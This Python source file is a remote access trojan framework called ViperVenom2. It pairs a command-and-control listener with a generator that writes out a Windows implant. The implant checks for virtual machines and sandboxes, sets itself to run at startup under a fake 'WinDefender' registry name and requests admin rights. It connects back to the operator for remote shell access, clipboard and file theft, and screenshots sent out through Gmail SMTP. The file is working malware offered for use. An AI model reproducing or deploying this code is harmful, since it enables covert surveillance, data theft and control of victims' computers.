#Eclipse Public License - v 2.0
#THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
#PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
#OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.
#IF YOU DISTRIBUTE THIS SOFTWARE YOU MUST GIVE A PROPER CREDIT TO THE AUTHOR
from cryptography.fernet import Fernet
import socket
import time
import platform
import os
import threading
from typing import Set
from scipy.io.wavfile import *
import base64
import random, string
from colorama import Fore, Back, Style
import smtplib
from cryptography.fernet import Fernet
import ctypes
import sys
from datetime import datetime
import ipaddress
now = datetime.today()
dataaa = (datetime.utcnow().strftime('%Y-%m-%d %H-%M-%S-%f')[:-3])
def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")
Clear()
time.sleep(1)
def Banner():
    print(f"""{Fore.RED}   
    Y
  .-^-.
 /     \      .- ~ ~ -.
()     ()    /   _ _   `.                     _ _ _
 \_   _/    /  /     \   \                . ~  _ _  ~ .
   | |     /  /       \   \             .' .~       ~-. `.
   | |    /  /         )   )           /  /             `.`.
   \ \_ _/  /         /   /           /  /                `'
    \_ _ _.'         /   /           (  (
                    /   /             \  \ 
                   /   /               \  \ 
                  /   /                 )  )
                 (   (                 /  /
                  `.  `.             .'  /
                    `.   ~ - - - - ~   .'
                       ~ . _ _ _ _ . ~s
""")
    print(f"{Fore.BLUE}The quieter you become, the more you can hear, ViperVenom\n")
    print(f"{Fore.RED}                  2{Fore.WHITE} [{Fore.CYAN}Payload Generators{Fore.WHITE}]")
    print(f"{Fore.RED}                  2{Fore.WHITE}     [{Fore.CYAN}Listeners{Fore.WHITE}]")
    print()
Banner()
print(f"{Fore.RED} Daily Tip:{Fore.WHITE} {random.choice(open('misc/daily_tip.txt').readlines())}")


def Menu():
    print(f"""
    {Fore.GREEN}Listeners             Description
    ---------             -----------
    {Fore.RED}1                      ViperVenom Payload Listener
    """,)
    print(f"""
    {Fore.GREEN}Generators            Description
    ----------            -----------
    {Fore.RED}2                      ViperVenom Payload Generator
    """,)
    print()

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
BUFFER_SIZE = 1024
global ListenerHost
global ListenerPort
global file_name


def Listener():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        ListenerHost = local_ip
        ListenerPort = 4434
        while True:
            landingHandler = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenom2 {Style.RESET_ALL}{Fore.WHITE}windows{Fore.RED}{Style.BRIGHT}(merciless/){Fore.WHITE}{Style.BRIGHT} > ")
            if landingHandler == "show payloads" or landingHandler == "list payloads" or landingHandler == "payloads" or landingHandler == "payloads list":
                print(f'''
                {Fore.GREEN}Payload                                    Description
                -------                                     -----------
                {Fore.RED}1 windows/merciless/tcp_payload             Undetectable ViperVenom Windows Payload
                
                {Fore.BLUE}[*]{Fore.WHITE} Select a payload by typing it's name or "use [Number]" for example: "use 1"
                ''')
            if landingHandler == "use windows/vipervenom/tcp/payload" or landingHandler ==  "use 1" or landingHandler == "use vipervenom/tcp/payload" or landingHandler == "vipervenom/tcp/payload" or landingHandler == "windows/vipervenom/tcp/payload":
                    while True:
                        firstHandler = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenom2 {Style.RESET_ALL}{Fore.WHITE}windows{Fore.RED}{Style.BRIGHT}(merciless/tcp_payload){Fore.WHITE}{Style.BRIGHT} > ")
                        if firstHandler[:8] == "set host":
                            ListenerHost = firstHandler[9:]
                            print(f"Host => {Fore.GREEN}{ListenerHost}")
                        if firstHandler == "set host":
                            ListenerHost = "0.0.0.0"
                            print(f"Host => {Fore.GREEN}{ListenerHost}")
                        if firstHandler[:8] == "set port":
                            ListenerPort = firstHandler[9:]
                            print(f"Port => {Fore.GREEN}{ListenerPort}")
                        if firstHandler == "set port":
                            ListenerPort = 4434
                            print(f"Port => {Fore.GREEN}{ListenerPort}")
                        if firstHandler[:7] == "set key":
                            Key = firstHandler[8:]
                            print(f"Key => {Fore.GREEN}{Key}")
                        if firstHandler == "use 2":
                            print(f"{Fore.GREEN}[+]{Fore.WHITE} Transferring to Generator...")
                            time.sleep(2)
                            PayloadGenerator()
                        if firstHandler == "options" or  landingHandler == "show options" or landingHandler == "show Options" or landingHandler == "show OPTIONS":
                            print(f'''



                            {Fore.GREEN}Option                     Current Setting
                            ------                     ---------------
                            {Fore.RED}Host                       {ListenerHost}
                            {Fore.RED}Port                       {ListenerPort}


                            {Fore.BLUE}[*] {Fore.WHITE}{Fore.RED}Tip:{Fore.WHITE} Set an option by typing "set [name]". For example: "set host 10.10.10.23"
                            ''')
                        if firstHandler == "run" or firstHandler == "exploit":
                            try:
                                s.bind((ListenerHost, int(ListenerPort)))
                            except OSError:
                                print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Invalid listener address, listening on 0.0.0.0")
                                ListenerHost = "0.0.0.0"
                                s.bind((ListenerHost, int(ListenerPort)))
                            time.sleep(1)
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Starting listener...")
                            try:
                                s.listen()
                            except socket.error:
                                print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Error while starting listener.")
                            time.sleep(1)
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Started TCP handler on {ListenerHost}:{ListenerPort}")
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Handler started, waiting for connection")
                            conn, addr = s.accept()
                            s.setblocking(1)
                            clientIP = s.getsockname()
                            with conn:
                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Merciless session opened ({ListenerHost}:{ListenerPort} <--> {clientIP}) at {dataaa}")
                                    time.sleep(1)
                                    print(f"{Fore.GREEN}[+]{Fore.WHITE} Connecting to Device.")
                                    while True:

                                        Handler = input(f"{Fore.WHITE}{Style.BRIGHT}Merciless {Style.RESET_ALL}> ")
                                        if Handler == "clear":
                                            if platform.system() == "Linux":
                                                os.system('clear')
                                            else:
                                                os.system("cls")
                                        elif Handler == "screenshot":
                                            conn.send(Handler.encode("utf-8"))
                                        elif Handler == "exit":
                                            conn.send(Handler.encode("utf-8"))
                                            print(f"{Fore.BLUE}[*] Exiting From Active Session...")
                                            time.sleep(3)
                                            conn.close()
                                        elif Handler == "restart":
                                            conn.send(Handler.encode("utf-8"))
                                        elif Handler == "shutdown":
                                            conn.send(Handler.encode("utf-8"))
                                        elif Handler == "shell":
                                            conn.send(Handler.encode("utf-8"))
                                            cwd = 'Shell'
                                            r = conn.recv(5120).decode('utf-8')
                                            if ('dir:' in r):
                                                cwd = r[4:]
                                            while True:
                                                command = input(str(cwd)+"> ")
                                                if 'terminate' in command:
                                                    conn.send('terminate'.encode('utf-8'))
                                                    conn.close()
                                                    break
                                                elif 'clipboard' in command:
                                                    conn.send(command.encode('utf-8'))
                                                    data = conn.recv(5120).decode("utf-8")
                                                    print(f"[{Fore.GREEN}CLIPBOARD{Fore.WHITE}] " + str(data))
                                                elif 'grab' in command:
                                                    conn.send(command.encode('utf-8'))
                                                    file_name = conn.recv(1024).decode('utf-8')
                                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Downloading " + file_name + "...")
                                                    file_size = conn.recv(1024).decode('utf-8')
                                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Total: " + str(int(file_size)/1024) + " KB")
                                                    with open(file_name, "wb") as file:
                                                        c = 0
                                                        start_time = time.time()
                                                        while c < int(file_size):
                                                            data = conn.recv(1024)
                                                            if not (data):
                                                                break
                                                            file.write(data)
                                                            c += len(data)
                                                        end_time = time.time()
                                                    print(f"{Fore.GREEN}[+]{Fore.WHITE} File Downloaded.")
                                                elif 'transfer' in command:
                                                    conn.send(command.encode('utf-8'))
                                                    file_name = command[9:]
                                                    file_size = os.path.getsize(file_name)
                                                    conn.send(file_name.encode('utf-8'))
                                                    conn.send(str(file_size).encode('utf-8'))
                                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Transferring [" + str(file_size/1024) + "] KB...")
                                                    with open(file_name, "rb") as file:
                                                        c = 0
                                                        start_time = time.time()
                                                        while c < int(file_size):
                                                            data = file.read(1024)
                                                            if not (data):
                                                                break
                                                            conn.sendall(data)
                                                            c += len(data)
                                                        end_time = time.time()
                                                        print(f"{Fore.GREEN}[+]{Fore.WHITE} File Transferred.")
                                                elif (len(command.strip()) > 0):
                                                    conn.send(command.encode('utf-8'))
                                                    r = conn.recv(5120).decode('utf-8')
                                                    if ('dir:' in r):
                                                        cwd = r[4:]
                                                    else:
                                                        print (r)
    except ConnectionResetError:
        print(f"{Fore.RED}[-]{Fore.WHITE} Lost Connection {Fore.GREEN}[REASON]{Fore.WHITE}: Client Closed Connection.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interruption.")
def PayloadGenerator():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        clientHOST = local_ip
        clientPORT = 4434
        SetYourEmail = "revise7@example.com"
        SetYourEmailPassword = "ExamplePassword"
        SetFileName = "NULL.py"
        micrecordsec = 600
        setSleep = "X"
        while True:
            landingHandler = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenom2 {Style.RESET_ALL}{Fore.WHITE}landing{Fore.RED}{Style.BRIGHT}(vipervenom/){Fore.WHITE}{Style.BRIGHT} > ")
            if landingHandler == "show payloads" or landingHandler == "list payloads" or landingHandler == "payloads" or landingHandler == "payloads list":
                print(f'''
                {Fore.GREEN}Payload                                    Description
                -------                                     -----------
                {Fore.RED}1 windows/merciless/tcp_payload          Undetectable ViperVenom Windows Payload\n
                {Fore.BLUE}[*] {Fore.WHITE}{Fore.RED}Tip:{Fore.WHITE} Select a payload by typing it's name or "use [Number]" for example: "use 1"
                ''')
            if landingHandler == "use windows/merciless/tcp_payload" or landingHandler == "use 1" or landingHandler == "windows/merciless/tcp_payload":
                while True:
                    firstHandler = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenomGen2 {Style.RESET_ALL}{Fore.WHITE}windows{Fore.RED}{Style.BRIGHT}(merciless/tcp_payload){Fore.WHITE}{Style.BRIGHT} > ")
                    if firstHandler[:14] == "set clienthost":
                        clientHOST = firstHandler[15:]
                        print(f"client Host => {Fore.GREEN}{clientHOST}")
                    if firstHandler == "set clienthost":
                        clientHOST = local_ip
                        print(f"client Host => {Fore.GREEN}{clientHOST}")
                    if firstHandler[:8] == "set clientport":
                        clientPORT = firstHandler[9:]
                        print(f"client Port => {Fore.GREEN}{clientPORT}")
                    if firstHandler[:13] == "set gmailaddr":
                        SetYourEmail = firstHandler[14:]
                        print(f"Gmail Address => {Fore.GREEN}{SetYourEmail}")
                    if firstHandler[:13] == "set gmailpass":
                        SetYourEmailPassword = firstHandler[14:]
                        print(f"Gmail Password => {Fore.GREEN}{SetYourEmailPassword}")
                    if firstHandler[:12] == "set filename":
                        SetFileName = firstHandler[13:]
                        print(f"File Name => {Fore.GREEN}{SetFileName}")
                        setSleep = firstHandler[13:]
                    if firstHandler[:9] == "set sleep":
                        setSleep = firstHandler[10:]
                        print(f"Sleep => {Fore.GREEN}{setSleep}")
                    if firstHandler == "options" or firstHandler == "show options" or firstHandler == "show OPTIONS" or firstHandler == "show Options":
                            print(f'''



                            {Fore.GREEN}Option                     Current Setting
                            ------                     ---------------
                            {Fore.RED}Client Host                {clientHOST}
                            {Fore.RED}Client Port                {clientPORT}
                            {Fore.RED}Gmail Address              {SetYourEmail}
                            {Fore.RED}Gmail Password             {SetYourEmailPassword}
                            {Fore.RED}File Name                  {SetFileName}
                            {Fore.RED}Sleep                      {setSleep}

                            ''')
                    if firstHandler == "generate" or firstHandler == "Generate" or firstHandler == "run" or firstHandler == "Run" or firstHandler == "exploit" or firstHandler == "Exploit":
                        print(f"{Fore.BLUE}[*]{Fore.WHITE} Generating Payload")
                        time.sleep(1)
                        print(".")
                        time.sleep(1)
                        print("..")
                        time.sleep(1)
                        print("...")
                        with open(SetFileName, "wb") as malfile:
                            malfile.write(f'''
#Eclipse Public License - v 2.0
#THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
#PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
#OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.
from PIL import ImageGrab
import socket
import smtplib
import base64
import os
import platform
import sounddevice
from scipy.io.wavfile import write
import time
import random, string
import psutil
import subprocess
import winreg as reg
import shutil
import ctypes
import sys
def zpVXAIPnyaQaYr():
    vmproc1 = "vmsrvc.exe"
    vmproc2 = "vmusrvc.exe"
    vmproc3 = "vmtoolsd.exe"
    vmproc5 = "vboxtry.exe"
    vmproc6 = "df5serv.exe"
    vmproc7 = "vboxservice.exe"
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() == vmproc1.lower() or proc.name().lower() == vmproc2.lower() or proc.name().lower() == vmproc3.lower() or proc.name().lower() == vmproc5.lower() or proc.name().lower() == vmproc6.lower() or proc.name().lower() == vmproc7.lower():
                exit()
        except WindowsError:
            vmpath1 = os.path.exists(r"C:\\windows\\system32\\drivers\\mci.sys")
            vmpath2 = os.path.exists(r"C:\\windows\\system32\\drivers\\mhgfs.sys")
            vmpath3 = os.path.exists(r"C:\\windows\\system32\\drivers\\mmouse.sys")
            vmpath4 = os.path.exists(r"C:\\windows\\system32\\drivers\\mscsi.sys")
            vmpath5 = os.path.exists(r"C:\\windows\\system32\\drivers\\musemouse.sys")
            vmpath6 = os.path.exists(r"C:\\windows\\system32\\drivers\\mx_svga.sys")
            vmpath7 = os.path.exists(r"C:\\windows\\system32\\drivers\\mxnet.sys")
            vmpath8 = os.path.exists(r"C:\\windows\\system32\\drivers\\VBoxMouse.sys")
            if vmpath1 == True or vmpath2 == True or vmpath3 == True or vmpath4 == True or vmpath5 == True or vmpath6 == True or vmpath7 == True or vmpath8 == True:
                exit()
zpVXAIPnyaQaYr()
letters = ''.join(random.choice(string.ascii_letters) for l in range(16))
X = 0
letters = time.sleep({setSleep})
letters
def zJnWJKrmzwZTAHJT(f_name, path):
    address=os.path.join(path, f_name)
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, "WinDefender 10.5", 0, reg.REG_SZ, address)
    reg.CloseKey(open)
#def XbNcYPeberQMdl(f_name, path):
    #address=os.path.join(path, f_name)
    #shutil.copytree(address, "C:\windows\system32", dirs_exist_ok=True)
    #shutil.copytree(address, "C:\windows", dirs_exist_ok=True)
BUFFER_SIZE = 1024
def connection():
    try:
        clientHOST="{clientHOST}"
        clientPORT={clientPORT}
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((clientHOST, clientPORT))
        s.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
        sys.setrecursionlimit(1500)
        while True:
            Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
            if Handler_DATA == "screenshot":
                screenshot = ImageGrab.grab()
                file = "xpvuNBYVvC.jpg"
                screenshot.save(file)
                f = open(file, 'rb')
                data=f.read()
                data=base64.b64encode(data)
                f.close()
                os.remove(file)
                smtp = smtplib.SMTP('smtp.gmail.com', 587)
                smtp.starttls()
                smtp.login("{SetYourEmail}", "{SetYourEmailPassword}")
                message = data
                smtp.sendmail("{SetYourEmail}", "{SetYourEmail}", message)
                smtp.quit()
            elif Handler_DATA == "restart":
                if platform.system() == "Windows":
                    os.system("shutdown -t 0 -r -f")
                else:
                    os.system("reboot")
            elif Handler_DATA == "shutdown":
                if platform.system() == "Windows":
                    os.system("shutdown /s /t 1")
                else:
                    os.system("shutdown now")
            elif Handler_DATA == "shell":
                    cwd = os.getcwd()
                    s.send(("dir:" + str(cwd)).encode('utf-8'))
                    while True:
                        try:
                            command = s.recv(2048).strip().decode('utf-8')
                            if 'terminate' in command:
                                break
                            elif 'clipboard' in command:
                                CF_TEXT = 1
                                kernel32 = ctypes.windll.kernel32
                                user32 = ctypes.windll.user32
                                kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
                                kernel32.GlobalLock.restype = ctypes.c_void_p
                                kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
                                user32.GetClipboardData.restype = ctypes.c_void_p
                                user32.OpenClipboard(0)
                                IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
                                GetClipboardData = user32.GetClipboardData
                                CloseClipboard = user32.CloseClipboard
                                try:
                                    if IsClipboardFormatAvailable(CF_TEXT):
                                        getClipboardData = GetClipboardData(CF_TEXT)
                                        getClipboardDataLoc = kernel32.GlobalLock(getClipboardData)
                                        text = ctypes.c_char_p(getClipboardDataLoc)
                                        value = text.value
                                        kernel32.GlobalUnlock(getClipboardDataLoc)
                                        s.send(str(value).encode("utf-8"))
                                    if IsClipboardFormatAvailable(CF_TEXT) == False:
                                        pass
                                finally:
                                    CloseClipboard()
                            #elif command.startswith('merciless'):
                                #file_name = command[7:]
                                #pth = os.getcwd()
                                #try:
                                    #XbNcYPeberQMdl(file_name, pth)
                                #except Exception as e:
                                    #s.send(str(e).encode('utf-8'))
                            elif command.startswith('grab'):
                                file_name = command[5:]
                                file_size = os.path.getsize(file_name)
                                s.send(file_name.encode('utf-8'))
                                s.recv(1024).decode('utf-8')
                                s.send(str(file_size).encode('utf-8'))
                                s.recv(1024).decode('utf-8')
                                with open(file_name, "rb") as file:
                                    c = 0
                                    start_time = time.time()
                                    while c < file_size:
                                        data = file.read(1024)
                                        if not (data):
                                            break
                                        s.sendall(data)
                                        c += len(data)
                                    end_time = time.time()
                            elif 'transfer' in command:
                                file_name = s.recv(1024).decode('utf-8')
                                file_size = s.recv(1024).decode('utf-8')
                                with open(file_name, "wb") as file:
                                    c = 0
                                    start_time = time.time()
                                    while c < int(file_size):
                                        data = s.recv(1024)
                                        if not (data):
                                            break
                                        file.write(data)
                                        c += len(data)
                                    end_time = time.time()
                            elif command.startswith('cd '):
                                dir = command[3:]
                                try:
                                    os.chdir(dir)
                                except:
                                    os.chdir(cwd)
                                cwd = os.getcwd()
                                s.send(("dir:" + str(cwd)).encode('utf-8'))
                            elif command.startswith('persistence'):
                                file_name = command[12:]
                                pth = os.getcwd()
                                try:
                                    zJnWJKrmzwZTAHJT(file_name, pth)
                                    s.send("Hooked".encode('utf-8'))
                                except Exception as e:
                                    s.send(str(e).encode('utf-8'))
                            else:
                                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                out = CMD.stdout.read()
                                err = CMD.stderr.read()
                                s.send(out)
                                s.send(err)
                                if (out == b'' and err == b''):
                                    s.send("Invalid".encode('utf-8'))
                        except Exception as e:
                            s.send(str(e).encode('utf-8'))
            elif Handler_DATA == "exit":
                s.close()
                exit()
    except socket.error:
        connection()
        if connection() == True:
            pass
        else:
            connection()
    except MemoryError:
        pass
    except SystemError:
        pass
def TeZfZTttAYMjZZ():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if TeZfZTttAYMjZZ():
    connection()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
TeZfZTttAYMjZZ()
def TCjgbxixqsdxEc():
    cpuChk = psutil.cpu_count(logical=False)
    if cpuChk == 1:
        exit()
    if cpuChk == 3:
        exit()
    else:
        connection()
TCjgbxixqsdxEc()
def PTYMEYUXBRwddE():
    avgDiskChk = shutil.disk_usage("/")
    div = (avgDiskChk // (2**30))
    if div == 59:
        exit()
    if div == 60:
        exit()
    if div == 65:
        exit()
    if div == 120:
        exit()
    if div == 119:
        exit()
    else:
        connection()
PTYMEYUXBRwddE()
''')
                            if platform.system() == "Windows":
                                os.system(f"python setup.py build")
                                os.remove(SetFileName)
                            else:
                                pass
                            time.sleep(2)
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Done Generating Payload.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interruption.")
        exit()
while True:
    try:
        des = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenom2 {Style.RESET_ALL}{Fore.WHITE}landing{Fore.RED}{Style.BRIGHT}(vipervenom/framework){Fore.WHITE}{Style.BRIGHT} > ")
        if des == "use 1":
            Listener()
        if des == "use 2":
            PayloadGenerator()
        if des == "list show":
            Menu()
        if des == "list":
            Menu()
        if des == "show list":
            Menu()
        if des == "exit":
            exit()
        if des == "Exit":
            exit()
    except KeyboardInterrupt:
        print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interruption.")
        exit()
